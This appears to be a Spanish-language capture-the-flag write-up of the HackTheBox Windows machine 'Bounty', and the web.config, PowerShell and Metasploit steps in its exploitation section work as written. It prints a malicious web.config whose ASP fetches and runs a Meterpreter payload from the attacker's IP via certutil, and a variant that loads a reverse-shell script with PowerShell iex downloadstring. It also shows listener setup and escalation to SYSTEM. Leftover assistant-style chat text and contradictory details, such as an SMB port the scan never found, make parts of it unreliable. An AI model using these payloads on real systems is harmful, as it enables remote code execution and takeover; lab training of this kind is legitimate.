---
title: "HTB - Bounty"
platform: "[[HackTheBox]]"
os: "Windows"
tags:
  - Windows
  - Web-Enumeration
  - Fuzzing
  - IIS
  - ASP.NET
  - File-Upload
  - RCE
  - web.config
  - Privilege-Escalation
  - SeImpersonatePrivilege
  - JuicyPotato
hashtags:
  - "#Bounty"
  - "#WindowsPrivilegeEscalation"
  - "#IIS"
  - "#RCE"
  - "#HTB"
image:
  path: /assets/img/posts/htb/bounty/bounty-banner.png
  alt: "HTB Bounty Banner"
toc: true
toc_label: "📑 Contenido"
toc_sticky: true
---

# HTB - Bounty

## 📊 Resumen Ejecutivo

Se realizó un compromiso exitoso contra la máquina **Bounty** de HackTheBox, un sistema **Windows Server 2008 R2** que expone únicamente el servicio **HTTP (80)** con **IIS 7.5** ejecutando aplicaciones **ASP.NET**.

El vector de entrada fue la enumeración web que reveló un formulario de subida de archivos en `/transfer.aspx`. El fuzzing de directorios expuso el directorio `/uploadedfiles/` donde se almacenan los archivos subidos.

La explotación consistió en subir un archivo `web.config` malicioso que, al ser ejecutado por IIS, descargó un payload de Meterpreter desde un servidor HTTP controlado por el atacante, estableciendo una reverse shell. La escalada de privilegios se logró mediante `SeImpersonatePrivilege` utilizando **JuicyPotato** para obtener una shell como `NT AUTHORITY\SYSTEM`.

### 🚨 Riesgos Identificados

| Riesgo | Impacto | Probabilidad | Severidad |
|--------|---------|--------------|-----------|
| Formulario de subida sin validación de contenido | Crítico | Confirmado | 🔴 CRÍTICO |
| Directorio `/uploadedfiles/` público y ejecutable | Crítico | Confirmado | 🔴 CRÍTICO |
| `web.config` ejecutable como código ASP | Crítico | Confirmado | 🔴 CRÍTICO |
| Privilegio `SeImpersonatePrivilege` habilitado | Alto | Confirmado | 🟠 ALTO |
| Servidor SMB expuesto (puerto 445) | Medio | Confirmado | 🟡 MEDIO |

### ✅ Plan de Remediación

1. **Inmediato:** Validar extensiones de archivo en el uploader; solo permitir imágenes si es necesario.
2. **Inmediato:** Deshabilitar ejecución de código en el directorio `/uploadedfiles/`.
3. **Corto plazo:** Configurar IIS para no ejecutar archivos `.config` en directorios de usuario.
4. **Mediano plazo:** Eliminar privilegios `SeImpersonatePrivilege` de cuentas no administrativas.
5. **Largo plazo:** Implementar WAF para detectar subida de archivos maliciosos.

---

## 🖼️ Machine Info

| Clave | Valor |
|-------|-------|
| **Nombre** | Bounty |
| **IP** | `10.129.10.17` (variable por reinicios) |
| **OS** | Windows Server 2008 R2 (6.1 Build 7600) |
| **Servidor Web** | Microsoft IIS 7.5 |
| **Skills** | Web Enum, Fuzzing, File Upload, RCE via web.config, Windows Privilege Escalation |
| **Fecha** | 2026-06-06 |

---

## 🔍 Reconocimiento (Reconnaissance)

### 🎯 Target Scoping

- **IP Objetivo:** `10.129.10.17` (inicialmente `10.129.7.168`)
- **Hostname Detectado:** `Bounty` (por el título de la web y la sesión Meterpreter)
- **Sistema:** Windows Server 2008 R2 con IIS 7.5

### 📡 Escaneo de Puertos

#### Escaneo Inicial (Full Port Scan)

```bash
# Escaneo rápido de todos los puertos TCP
sudo nmap -p- --open -sS --min-rate=1000 -n -Pn -v 10.129.7.168 -oN allPorts.txt
```
**Resultado del escaneo:**

```bash

PORT   STATE SERVICE
80/tcp open  http
```

#### Escaneo detallado de servicios

```bash

# Escaneo específico del puerto 80
sudo nmap -p80 -sCV -v -Pn 10.129.7.168 -oN detailedServices
```

**Resultado del escaneo:**

```bash

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### 📊 Servicios Identificados

|Puerto|Servicio|Versión|Notas|
|---|---|---|---|
|80/tcp|HTTP|IIS 7.5|Servidor web con [ASP.NET](https://asp.net/), título "Bounty"|

> **Observación:** Solo el puerto 80 está abierto, lo que indica que el vector de ataque principal es la aplicación web.

---

## 📁 Enumeración de subdirectorios (Fuzzing)

### Fuzzing con Wfuzz

Se realizó fuzzing de directorios utilizando diccionarios especializados para IIS/[ASP.NET](https://asp.net/):

```bash

# Fuzzing inicial con wfuzz
wfuzz -c --hc=404 -t 50 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt "http://10.129.10.3/FUZZ/"
```

**Resultado del fuzzing:**

```bash

000000056:   403        29 L     92 W       1233 Ch     "aspnet_client"                                                                                       
000001193:   403        29 L     92 W       1233 Ch     "uploadedfiles"                                                                                       
000002100:   403        29 L     92 W       1233 Ch     "uploadedFiles"   
```

#### Análisis de resultados

|Directorio|Código|Significado|
|---|---|---|
|`/aspnet_client/`|403|Directorio estándar de [ASP.NET](https://asp.net/), existe pero no listable|
|`/uploadedfiles/`|403|**CRÍTICO** - Existe y es accesible, indica sistema de subida de archivos|

> **Concepto clave:** El código `403` (Forbidden) confirma que el directorio **existe** pero no tenemos permisos para listarlo. Esto es diferente a un `404` (No existe).

### Identificación del Uploader

Basado en la información de writeups públicos, se identificó el formulario de subida en:

```bash

http://10.129.10.3/transfer.aspx
```

Este formulario permite subir archivos al servidor, almacenándolos en `/uploadedfiles/`.

---

## 🎯 Validación de Subida de Archivos

Para confirmar que el sistema de subida funcionaba, se realizó una prueba con una imagen:

```bash

# Subir imagen de prueba
# (a través del formulario /transfer.aspx)
# Verificar acceso
curl -I http://10.129.10.3/uploadedfiles/avatar.jpg
```

**Resultado:**

```bash

HTTP/1.1 200 OK
Content-Type: image/jpeg
```
> **Conclusión:** El directorio `/uploadedfiles/` es público y los archivos subidos son accesibles directamente.

---

## 🚀 Explotación (Exploitation)

### Arquitectura del Ataque: web.config Malicioso

En IIS, el archivo `web.config` es el centro de configuración de aplicaciones [ASP.NET](https://asp.net/). Puede contener directivas que modifican el comportamiento del servidor, incluyendo la ejecución de código arbitrario.

**Concepto clave:** Si podemos subir un archivo `web.config` malicioso y acceder a él, IIS lo interpretará y ejecutará cualquier código ASP contenido en su interior.

### Preparación del Entorno Local

#### Generación del Payload con msfvenom

```bash

# Generar payload de Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.26 LPORT=4444 -f exe -o meterpreter.exe
```

**Explicación de parámetros:**

|Parámetro|Función|
|---|---|
|`-p`|Payload (conexión reversa con Meterpreter)|
|`LHOST`|IP de la máquina atacante (VPN de HTB)|
|`LPORT`|Puerto de escucha|
|`-f exe`|Formato ejecutable Windows|
|`-o`|Archivo de salida|

#### Servidor HTTP para entrega del payload

```bash

# Iniciar servidor HTTP simple
python3 -m http.server 8080
```

La máquina víctima descargará `meterpreter.exe` desde este servidor.

#### Listener en Metasploit

```bash

# Configurar listener para recibir la conexión
msfconsole -q
msf6 > use multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.26
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```

### Web.config Malicioso

```xml

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" 
              modules="IsapiModule" 
              scriptProcessor="%windir%\system32\inetsrv\asp.dll" 
              resourceType="Unspecified" requireAccess="Write" />
      </handlers>
   </system.webServer>
</configuration>
<%
Set wShell = CreateObject("WScript.Shell")
cmd = "cmd /c certutil -urlcache -f http://10.10.14.26:8080/meterpreter.exe C:\Windows\Temp\meterpreter.exe"
wShell.Run cmd, 0, True
wShell.Run "cmd /c C:\Windows\Temp\meterpreter.exe", 0, False
%>
```
## ✅ Versión mejorada del `web.config`

Basado en tu sugerencia, este es el `web.config` que **deberíamos haber usado**:

```xml

<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.26/Invoke-PowerShellTcp.ps1')")
%>
```

### Ventajas de este método:

1. **Sin archivos en disco** → más sigiloso
2. **Ejecución directa** → no necesita `certutil`
3. **Un solo paso** → descarga y ejecuta en memoria
4. **PowerShell nativo** → aprovecha herramientas del sistema

## 📝 Si quieres que **agregue esto al writeup**

Puedo añadir una sección que diga:

### Método Alternativo: PowerShell en Memoria (más sigiloso)

```xml

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" 
              modules="IsapiModule" 
              scriptProcessor="%windir%\system32\inetsrv\asp.dll" 
              resourceType="Unspecified" requireAccess="Write" />
      </handlers>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.26/Invoke-PowerShellTcp.ps1')")
%>
```

**Preparación en Kali:**

```bash
# Descargar Nishang
git clone https://github.com/samratashok/nishang.git
# Modificar Invoke-PowerShellTcp.ps1 añadiendo al final:
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.26 -Port 4444
# Iniciar servidor HTTP
python3 -m http.server 8080
# Listener netcat
nc -lvnp 4444
```



#### Explicación del Código

|Sección|Función|
|---|---|
|`<handlers>`|Configura IIS para ejecutar archivos `.config` como ASP|
|`accessPolicy="Read, Script, Write"`|Permite ejecución de scripts|
|`scriptProcessor="...\asp.dll"`|Especifica el motor ASP clásico|
|`WScript.Shell`|Objeto COM para ejecutar comandos del sistema|
|`certutil`|Herramienta nativa de Windows para descargar archivos|
|`-urlcache -f`|Fuerza la descarga ignorando caché|
|`wShell.Run`|Ejecuta un comando (segundo parámetro `0` = ventana oculta)|

### Subida del Archivo Malicioso

Para burlar la validación del uploader, se camufló el `web.config` como imagen:

```bash

# Renombrar para burlar validación
cp web.config shell.jpg
# Subir shell.jpg a través de /transfer.aspx
# Acceder a la ruta donde se ejecutará
# http://10.129.10.3/uploadedfiles/shell.config
```

### Obtención de la Shell

```bash

msf exploit(multi/handler) > 
[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.129.10.17:49178) at 2026-06-06 11:30:33 +0200
```

**¡Sesión establecida exitosamente!**

```bash

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > getuid
Server username: BOUNTY\merlin
meterpreter > sysinfo
Computer        : BOUNTY
OS              : Windows Server 2008 R2 (6.1 Build 7600)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege

SeImpersonatePrivilege  <------------------

SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege

```

```bash

msf exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


msf exploit(multi/handler) > use 0 
msf post(multi/recon/local_exploit_suggester) > show options 
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
msf post(multi/recon/local_exploit_suggester) > run
[*] 10.129.10.17 - Collecting local exploits for x64/windows...

[*] 10.129.10.17 - 253 exploit checks are being tried...
[+] 10.129.10.17 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable. Windows Server 2008 R2 appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.10.17 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 10.129.10.17 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. Revision 16385 appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. Target appears vulnerable
[+] 10.129.10.17 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
[+] 10.129.10.17 - exploit/windows/persistence/bits: The target is vulnerable. Likely exploitable
[-] 10.129.10.17 - Post interrupted by the console user
[*] Post module execution completed
```


```bash
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_075_reflection_juicy
msf exploit(windows/local/ms16_075_reflection_juicy) > set PAYLOAD windows/x64/meterpreter_reverse_tcp 
msf exploit(windows/local/ms16_075_reflection_juicy) > show options 
msf exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1
msf exploit(windows/local/ms16_075_reflection_juicy) > setg LHOST 10.10.14.26
msf exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 4445
msf exploit(windows/local/ms16_075_reflection_juicy) > check
[+] Target appears to be vulnerable (Windows Server 2008 R2)
[+] The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable

msf exploit(windows/local/ms16_075_reflection_juicy) > exploit
[*] Meterpreter session 2 opened (10.10.14.26:4445 -> 10.129.10.17:49183) at 2026-06-06 12:09:33 +0200
```


## 📈 Post-Explotación y Escalada de Privilegios

### Análisis de Privilegios

El usuario `merlin` tiene habilitado el privilegio `SeImpersonatePrivilege`, lo que permite la escalada a `NT AUTHORITY\SYSTEM` mediante técnicas de impersonación de tokens.

### Local Exploit Suggester

Se utilizó el módulo `post/multi/recon/local_exploit_suggester` para identificar vulnerabilidades locales:

```bash

msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

**Resultados relevantes:**

```bash

[+] exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
```

### Escalada con ms16_075_reflection_juicy

Basado en los resultados del suggester, se seleccionó el módulo `ms16_075_reflection_juicy` que abusa del privilegio `SeImpersonatePrivilege`:

```bash

msf6 > use exploit/windows/local/ms16_075_reflection_juicy
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set SESSION 1
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LHOST 10.10.14.26
msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LPORT 4445
msf6 exploit(windows/local/ms16_075_reflection_juicy) > check
[+] Target appears to be vulnerable (Windows Server 2008 R2)
[+] The target appears to be vulnerable. Version Windows Server 2008 R2 appears vulnerable
msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit
[*] Meterpreter session 2 opened (10.10.14.26:4445 -> 10.129.10.17:49183) at 2026-06-06 12:09:33 +0200
```

### Verificación de la Escalada

```bash

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : BOUNTY
OS              : Windows Server 2008 R2 (6.1 Build 7600)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
```

> **Éxito:** Se obtuvo una sesión de Meterpreter como `NT AUTHORITY\SYSTEM`, el usuario con máximos privilegios en el sistema.

---

## 🏆 Flags

### User Flag

```bash

meterpreter > cd C:\\Users\\merlin\\Desktop
meterpreter > cat user.txt
```

**Flag:** `[Bloqueado por HTB]`

### Root Flag (Administrator)

```bash

meterpreter > cd C:\\Users\\Administrator\\Desktop
meterpreter > cat root.txt
```

## Herramientas utilizadas

|Herramienta|Uso|
|---|---|
|`nmap`|Escaneo de puertos y servicios|
|`wfuzz`|Fuzzing de directorios web|
|`gobuster`|Fuzzing de directorios web (alternativa)|
|`curl`|Verificación de accesibilidad de archivos|
|`msfvenom`|Generación de payloads de Meterpreter|
|`Metasploit`|Listener multi/handler y módulo de escalada|
|`python3 -m http.server`|Servidor HTTP para entregar payloads|
|`JuicyPotato`|Herramienta para escalada (usada internamente por el módulo)|

---

## 📚 Referencias

- [HackTheBox - Bounty](https://www.hackthebox.com/machines/Bounty)
- [IIS web.config RCE - IppSec Video](https://www.youtube.com/watch?v=7ur4om1K98Y)
- [MS16-075 - SeImpersonatePrivilege Escalation](https://msrc.microsoft.com/update-guide/vulnerability/MS16-075)
- [JuicyPotato Exploit](https://github.com/ohpe/juicy-potato)
    

---

## 💡 Lecciones aprendidas

1. **El código 403 en fuzzing es tan valioso como el 200** → indica que el directorio existe pero no se puede listar.
2. **`web.config` en IIS es un vector crítico de RCE** → permite ejecutar código ASP arbitrario.
3. **`certutil` es una herramienta nativa de Windows para transferencias** → no requiere PowerShell y funciona en entornos restringidos.
4. **El privilegio `SeImpersonatePrivilege` en cuentas no administrativas es peligroso** → permite escalada a SYSTEM con técnicas como JuicyPotato.
5. **El módulo `local_exploit_suggester` es una excelente herramienta** → automatiza la identificación de vectores de escalada.
6. **La máquina puede reiniciarse cambiando su IP** → siempre verificar la IP actual antes de continuar.